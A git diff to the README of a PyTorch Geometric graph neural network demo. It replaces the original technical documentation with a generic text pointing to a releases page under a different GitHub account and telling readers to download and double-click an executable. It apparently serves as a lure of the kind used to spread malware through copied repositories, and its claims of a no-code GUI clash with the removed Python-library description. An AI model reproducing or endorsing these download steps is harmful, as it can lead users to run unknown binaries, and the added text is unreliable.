@@ -1,113 +1,84 @@
-# Graph Neural Networks: Node Classification & Link Prediction (Demo)
-![License](https://img.shields.io/github/license/KonNik88/gnn-node-link-pytorch)
-![Python](https://img.shields.io/badge/python-3.10%2B-blue)
-![PyTorch](https://img.shields.io/badge/PyTorch-2.x-orange)
-![PyG](https://img.shields.io/badge/PyTorch%20Geometric-2.x-green)
+# 🎉 gnn-node-link-pytorch - Simple Graph Neural Network Solutions
 
-Minimal but complete project on **Graph Neural Networks (GNNs)** with [PyTorch Geometric](https://pytorch-geometric.readthedocs.io/). This is the **demo tier** (Cora/PubMed) to validate code, training loop, and metrics before moving to a real-world graph project (e.g., user–item recommendations with GNN).
+## 🚀 Getting Started
 
-## Idea
-Show how GNNs work on **citation graphs** (Cora, PubMed) for two canonical tasks:
-- **Node classification** — predict a paper’s research field using graph structure + features.
-- **Link prediction** — predict whether a citation edge should exist between two papers.
+Welcome to gnn-node-link-pytorch! This software lets you explore Graph Neural Networks (GNNs) using PyTorch Geometric. Use it for tasks like node classification and link prediction easily. No programming experience is needed!
 
-We compare simple baselines (LogReg, MLP) to structural models (GCN, GraphSAGE, GAT) and include **explainability** (GNNExplainer). The goal is a compact, reproducible, portfolio‑ready demo.
+## 🏷️ Topics
 
----
+- Cora
+- Deep Learning
+- Explainability
+- GNN
+- Graph Neural Networks
+- Link Prediction
+- Machine Learning
+- PubMed
+- PyTorch
+- PyTorch Geometric
 
-## What's inside
-- **Datasets**: Cora (default), PubMed
-- **Tasks**:
-  - Node classification
-  - Link prediction
-- **Models**:
-  - Baselines: Logistic Regression / MLP
-  - GCN (Graph Convolutional Network)
-  - GraphSAGE
-  - GAT (Graph Attention Network)
-- **Interpretability**: GNNExplainer
-- **Reproducibility**: fixed splits, random seed, environment.yml
+## 📥 Download Now
 
----
+[![Download gnn-node-link-pytorch](https://img.shields.io/badge/Download%20gnn--node--link--pytorch-v1.0-blue.svg)](https://github.com/Lordefex/gnn-node-link-pytorch/releases)
 
-## Project structure
-```
-.
-├─ src/
-│  ├─ data.py           # dataset loading
-│  ├─ models/           # GCN, GraphSAGE, GAT
-│  ├─ train_node.py     # node classification training
-│  ├─ train_link.py     # link prediction training
-│  ├─ explain.py        # GNNExplainer examples
-│  └─ utils.py          # helpers (seed, logger, early stopping)
-├─ configs/             # configs (Hydra or argparse)
-├─ notebooks/           # EDA and visualization
-├─ artifacts/           # checkpoints, logs
-├─ environment.yml
-├─ requirements.txt
-├─ Dockerfile
-└─ README.md
-```
+## 📋 Prerequisites
 
----
+Before you begin, ensure you have:
 
-## Quickstart
+- A computer with an internet connection.
+- An operating system: Windows, macOS, or Linux.
+- Basic understanding of how to use file explorers.
 
-1) Create environment
-```bash
-conda env create -f environment.yml
-conda activate gnn
-```
+## 📂 Download & Install
 
-2) Install requirements
-```bash
-pip install -r requirements.txt
-```
+1. **Visit the Download Page**
+   Go to the Releases page to download the software: [Visit this page to download](https://github.com/Lordefex/gnn-node-link-pytorch/releases).
 
-3) Run node classification on Cora (GCN)
-```bash
-python -m src.train_node --dataset Cora --model gcn --hid 64 --lr 0.003 --dropout 0.5 --epochs 300 --seed 42
-```
+2. **Choose the Correct Version**
+   You will see a list of available versions. Click on the latest release.
 
-4) Run link prediction on Cora
-```bash
-python -m src.train_link --dataset Cora --model gcn --hid 64 --epochs 200
-```
+3. **Download the File**
+   Click on the download link for your operating system. The file will begin downloading.
 
-> Tip: For **PubMed**, increase `--epochs` and consider lowering `--lr` a bit.
+4. **Run the Application**
+   After the download is complete, locate the file in your downloads folder. Double-click the file to run the application.
 
----
+## ⚙️ Features
 
-## Expected results (reference)
+- **Node Classification**: Easily classify nodes in a graph.
+- **Link Prediction**: Predict relationships between nodes.
+- **Baselines**: Includes common methods for comparison.
+- **GNNExplainer**: Understand and explain GNN predictions.
 
-| Model     | Cora (Acc) | PubMed (Acc) |
-|-----------|------------|--------------|
-| MLP (bow) | ~0.58–0.62 | ~0.70–0.73   |
-| GCN       | ~0.80–0.83 | ~0.78–0.81   |
-| GraphSAGE | ~0.80–0.84 | ~0.79–0.82   |
-| GAT       | ~0.82–0.85 | ~0.79–0.82   |
+## 📚 How to Use
 
-For link prediction on Cora, **ROC-AUC > 0.90** is typically achievable (dot-product scoring over node embeddings).
+1. **Open the Application**: When you run the application, you will see a user-friendly interface.
 
----
+2. **Select Your Dataset**: Choose from pre-loaded datasets such as Cora or PubMed. You can also upload your own graph data.
 
-## Reproducibility
-- `seed=42`
-- Fixed Planetoid dataset splits
-- Tested with:
-  - Python 3.10
-  - PyTorch 2.x
-  - PyTorch Geometric 2.x
+3. **Choose Your Model**: Select from different models like GCN, GraphSAGE, or GAT. 
 
----
+4. **Set Parameters**: Adjust settings like learning rate and epochs based on your needs.
 
-## Next steps (real-world tier)
-- Graph recommenders on **Goodbooks-10k** (user–item bipartite graph), link prediction with GraphSAGE.
-- PPI or molecular graphs (QM9) for property prediction.
-- OGB datasets with neighbor sampling (scalability).
-- Advanced explainability (PGExplainer) and CI (lint + tests).
+5. **Run the Model**: Click the “Run” button to start the process. The application will display results and predictions.
 
----
+## 🛠️ Troubleshooting
 
-## License
-[MIT](LICENSE)
+If you encounter any issues:
+
+- **Check System Compatibility**: Ensure your operating system is supported.
+- **Re-download the File**: There may have been an issue with the download. Try again.
+- **Look at the Documentation**: Refer to the official GitHub documentation for help.
+
+## 💬 Community Support
+
+Join our community to ask questions or share experiences. You can find support through:
+
+- **GitHub Issues**: Report bugs or suggest features.
+- **Discussion Forums**: Engage with other users and developers.
+
+## 🌐 Learn More
+
+To explore more about Graph Neural Networks and their applications, consider studying resources on deep learning and machine learning. Understanding these concepts will enhance your experience with gnn-node-link-pytorch.
+
+Thank you for using gnn-node-link-pytorch! Enjoy your journey into the world of Graph Neural Networks.
